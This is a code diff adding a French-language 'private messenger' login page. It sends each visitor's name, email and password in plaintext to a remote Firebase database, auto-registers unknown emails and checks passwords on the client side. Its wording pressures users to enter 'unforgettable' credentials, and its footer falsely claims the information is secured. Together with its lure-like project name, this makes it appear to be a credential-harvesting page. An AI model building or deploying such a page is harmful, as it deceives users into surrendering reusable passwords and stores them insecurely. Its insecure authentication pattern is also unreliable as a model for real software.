@@ -1,0 +1,133 @@
+   <!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connexion</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+<style>
+
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI", Arial, sans-serif;}
+body{height:100vh;display:flex;justify-content:center;align-items:center;background:linear-gradient(135deg,Gold,white,black,DarkGray,NavajoWhite,Deeppink,tan,RoyalBlue,black,tomato);}
+.login-container{background:tan;width:100%;max-width:420px;padding:35px 30px;border-radius:25px;box-shadow:0 20px 40px rgba(0,0,0,0.25);text-align:center;animation:fadeIn 0.6s ease;}
+@keyframes fadeIn{from{opacity:0; transform:translateY(20px);} to{opacity:1; transform:translateY(0);}}
+.login-container h2{font-size:28px;color:red;margin-bottom:8px;}
+.login-container p{color:Black;font-size:14px;margin-bottom:25px;}
+.login-container input{width:100%;padding:15px 18px;margin-bottom:18px;border-radius:14px;border:1px solid black;font-size:15px;outline:none;transition:0.3s;}
+.login-container input:focus{border-color:blue;box-shadow:0 0 0 3px rgba(79,172,254,0.2);}
+.login-container button{width:100%;padding:15px;border:none;border-radius:16px;background:linear-gradient(135deg,green,yellow,red);color:black;font-size:18px;font-weight:600;cursor:pointer;transition:0.3s;}
+.login-container button:hover{transform:translateY(-2px);box-shadow:0 10px 20px rgba(0,0,0,0.2);}
+.login-container button:active{transform:scale(0.98);}
+.footer-text{margin-top:18px;font-size:13px;color:purple;}
+</style>
+</head>
+
+<body>
+
+<div class="login-container">
+  <h2>CONNEXION</h2>
+  <p>b4r u enter ur full informations u've been must keept on awarness that,u're ought 2 cramed its as ur next connexion, otherwise u'll lose ur access's msnger </p>
+  <p>Acess ur pvt msnger by enter unforgetable identifiers</p>
+
+  <form id="loginForm">
+    <input type="text" id="nom" placeholder="1st/2nd name" required>
+    <input type="email" id="email" placeholder=" email Adress" required>
+    <input type="password" id="password" placeholder="password(do not forget it)" required>
+    <button type="submit" id="submitBtn">CONNECT</button>
+  </form>
+
+  <div class="footer-text">ur informations are secured !</div>
+</div>
+
+<script>
+// ==== CONFIGURATION FIREBASE  ====
+
+const firebaseConfig = {
+  apiKey: "AIzaSyDIuRM5Eo6IVG_ghspnIQMcmAabgfcCn7k",
+  authDomain: "meet-ur-night-s-dominator.firebaseapp.com",
+  projectId: "meet-ur-night-s-dominator",
+  storageBucket: "meet-ur-night-s-dominator.firebasestorage.app",
+  messagingSenderId: "1021669198456",
+  appId: "1:1021669198456:web:31a62bb6003888060afb8d",
+  measurementId: "G-SFPWNFM8PY",
+  databaseURL: "https://meet-ur-night-s-dominator-default-rtdb.europe-west1.firebasedatabase.app"
+};
+
+// Initialisation Firebase
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+// Récupération des infos du profil choisi sur Index.html
+
+const imgNumChoisi = localStorage.getItem('selectedImgId');
+const nomProfil = localStorage.getItem('selectedProfile');
+
+const loginForm = document.getElementById("loginForm");
+const submitBtn = document.getElementById("submitBtn");
+
+loginForm.addEventListener("submit", function(e){
+  e.preventDefault();
+  submitBtn.disabled = true;
+  submitBtn.innerText = "Checking...";
+
+  const nom = document.getElementById("nom").value.trim();
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value.trim();
+  const userKey = email.replace(/\./g, '_');
+
+  // Vérification dans Firebase
+  
+  db.ref("registered_users/" + userKey).once("value").then((snapshot) => {
+    const userData = snapshot.val();
+
+    if(userData) {
+      if(userData.password !== password) {
+        alert("Incorrect password!");
+        submitBtn.disabled = false;
+        submitBtn.innerText = "CONNECT";
+        return;
+      }
+    } else {
+      // Nouvel utilisateur
+      
+      db.ref("registered_users/" + userKey).set({
+        nom: nom,
+        email: email,
+        password: password,
+        dateJoined: new Date().toLocaleString()
+      });
+    }
+
+    // --- LOGIQUE DE BRANCHEMENT ---
+    
+    localStorage.setItem("currentUserEmail", email);
+    localStorage.setItem("currentUserName", nom);
+
+    // On vérifie si ce compte a déjà scanné ce profil spécifique
+    
+    const hasScannedBefore = localStorage.getItem('scanned_' + userKey + '_' + imgNumChoisi);
+
+    if(hasScannedBefore === "true") {
+      // Déjà scanné -> Vers le Chat
+      
+      window.location.href = `page3.html?img=${imgNumChoisi}&email=${encodeURIComponent(email)}`;
+    } else {
+      // Premier scan pour ce profil -> Vers Page 2
+      
+      window.location.href = `page2.html?img=${imgNumChoisi}&email=${encodeURIComponent(email)}`;
+    }
+
+  }).catch((error) => {
+    console.error(error);
+    alert("Connection error. Check your database status.");
+    submitBtn.disabled = false;
+    submitBtn.innerText = "CONNECT";
+  });
+});
+</script>
+
+</body>
+</html>
